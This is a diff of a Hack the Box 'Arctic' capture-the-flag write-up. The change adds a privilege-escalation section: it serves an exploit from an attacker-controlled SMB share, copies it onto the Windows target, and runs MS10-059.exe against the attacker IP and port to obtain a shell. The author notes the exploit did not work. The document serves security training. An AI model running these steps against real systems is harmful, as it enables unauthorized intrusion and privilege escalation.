@@ -1,4 +1,4 @@
-# Hack the Box - Arctic
+# Hack the Box - Arctic (INCOMPLETE)
 
 ```CSS
 Machine IP: 10.10.10.11 - Windows
@@ -61,8 +61,21 @@ Nmap done: 1 IP address (1 host up) scanned in 137.00 seconds
 ### System Information Gathering
 ![image](https://user-images.githubusercontent.com/83878909/229284588-f0e96832-3491-4d2b-a027-54795caa0a55.png)
 
+  - The target machine's kernel is vulnerable to **MS10-059**.
 
+### Transfer the Exploit
+  - 
+```CSS
+▶ impacket-smbserver share $(pwd) -smb2support 
+```
+```CSS
+C:\ColdFusion8\runtime\bin>copy \\10.10.14.34\share\MS10-059.exe
+```
+![image](https://user-images.githubusercontent.com/83878909/229288769-d14bb122-6ee6-44b0-bda4-9e8aae81d22b.png)
 
+### Execute the Exploit
+```CSS
+MS10-059.exe 10.10.14.34 31337
+```
 
-
-
+# EXPLOIT DOES NOT WORK
